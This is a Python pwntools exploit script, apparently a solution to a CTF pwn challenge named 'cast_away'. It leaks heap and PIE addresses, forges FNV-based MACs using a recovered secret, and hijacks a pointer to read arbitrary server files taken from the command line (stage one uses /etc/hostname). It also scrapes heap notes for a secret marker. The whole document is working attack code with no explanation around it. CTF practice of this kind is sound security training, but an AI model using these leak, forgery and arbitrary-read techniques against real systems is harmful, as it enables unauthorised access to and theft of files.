import sys, re
from pwn import *
context.log_level = 'error'

MODE = sys.argv[1]
TARGET_PATH = sys.argv[2]
MARKER = sys.argv[3].encode() if len(sys.argv) > 3 else b"SECRET"

def fnv(b):
    h = 0xcbf29ce484222325
    for x in b:
        h = ((h ^ x) * 0x100000001b3) & (2**64 - 1)
    return h

if MODE == 'local':
    p = process('/home/sira/Documents/CTF/Lancang_Mekong_CTF_comp/solved/pwn_cast_away/cast_away')
else:
    host, port = MODE.split(':')
    p = remote(host, int(port))


def cmd(s):
    p.recvuntil(b'castaway> ')
    p.sendline(s.encode() if isinstance(s, str) else s)


def U():
    lo, hi = 0, (1 << 64) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        cmd('UNLOCK %016x' % mid)
        l = p.recvline()
        if b'equal' in l:
            return
        if b'higher' in l:
            lo = mid + 1
        else:
            hi = mid - 1
    cmd('UNLOCK %016x' % lo)
    p.recvline()


def E(i, v):
    cmd('EDIT %d %016x' % (i, v & (2**64 - 1)))
    return int(p.recvline().split(b'previous=')[1].strip(), 16)


def RD(i):
    v = E(i, 0)
    E(i, v)
    return v


def run_read():
    cmd('RUN')
    r = p.recvline()
    m = re.search(rb'export output \((\d+) bytes\):', r)
    if m and b'redacted' not in r:
        n = int(m.group(1))
        d = p.recvn(n)
        p.recvn(1)
        return d, r.strip()
    return None, r.strip()


def prepare(n):
    cmd('PREPARE_EXPORT ' + n)
    return p.recvline()


SSOV = 0x8108
U()
cmd('SURVEY')
p.recvline()
cmd('SWITCH')
p.recvline()
prepare('readme.txt')
heap_leak = RD(0)
szf = RD(4)
tag = RD(5)
mac0 = RD(6)
salt0 = RD(7)
pie = tag - salt0 - 0x8080
secA = mac0 ^ fnv(b'/srv/survey/exports/readme.txt') ^ fnv(p64(szf)) ^ fnv(p64(salt0))
sso = pie + SSOV
print("[*] pie=%#x heap_leak=%#x secA=%#x" % (pie, heap_leak, secA))

# stage1: force "redacted" branch to unlock notes
tp = b'/etc/hostname'
E(2, u64(tp[:8]))
E(3, u64(tp[8:].ljust(8, b'\0')))
E(1, len(tp))
E(0, sso)
E(4, 0x1000)
E(6, fnv(tp) ^ fnv(p64(0x1000)) ^ fnv(p64(salt0)) ^ secA)
cmd('RUN')
r = p.recvline()
if b'redacted' not in r:
    print("[!] stage1 unexpected:", r)
else:
    print("[+] notes unlocked")

cmd('NOTE_NEW 1024')
nl = p.recvline()
nid = int(re.search(rb'note (\d+)', nl).group(1))


def write_note(path):
    data = path.encode() + b'\0'
    for i in range((len(data) + 7) // 8):
        ch = data[i * 8:i * 8 + 8].ljust(8, b'\0')
        cmd('NOTE_WRITE %d %d %016x' % (nid, i * 8, u64(ch)))
        p.recvline()


def set_meta(path, size):
    salt_cur = RD(7)
    E(1, len(path))
    E(4, size)
    E(6, fnv(path.encode()) ^ fnv(p64(size)) ^ fnv(p64(salt_cur)) ^ secA)


cal = '/srv/survey/exports/readme.txt'
write_note(cal)
set_meta(cal, 52)
good_delta = None
for delta in range(0x10, 0x1200, 0x10):
    E(0, heap_leak + delta)
    d, st = run_read()
    if d is not None:
        good_delta = delta
        break
if good_delta is None:
    print("[!] calibration failed")
    sys.exit()
note_addr = heap_leak + good_delta
print("[*] note_addr=%#x" % note_addr)

write_note(TARGET_PATH)
E(0, note_addr)
set_meta(TARGET_PATH, 4096)
d, st = run_read()
print("[*] RUN on target:", st)
if d:
    print("CONTENT:", d[:200])

hits = []
for sz in (0x400, 0x200, 0x100, 0x80, 0x40, 0x1000):
    cmd('NOTE_NEW %d' % sz)
    rl = p.recvline()
    m = re.search(rb'note (\d+)', rl)
    if not m:
        print("[-] NOTE_NEW failed:", rl)
        continue
    pid = int(m.group(1))
    blob = b""
    for off in range(0, min(sz, 0x400), 8):
        cmd('NOTE_READ %d %d' % (pid, off))
        rl2 = p.recvline()
        m = re.search(rb'= ([0-9a-f]{16})', rl2)
        if not m:
            break
        blob += int(m.group(1), 16).to_bytes(8, 'little')
    if MARKER in blob:
        print("[+] FOUND marker in note", pid, "size", sz)
        print(blob)
        hits.append(pid)
if not hits:
    print("[-] marker not found in probed notes")
p.close()
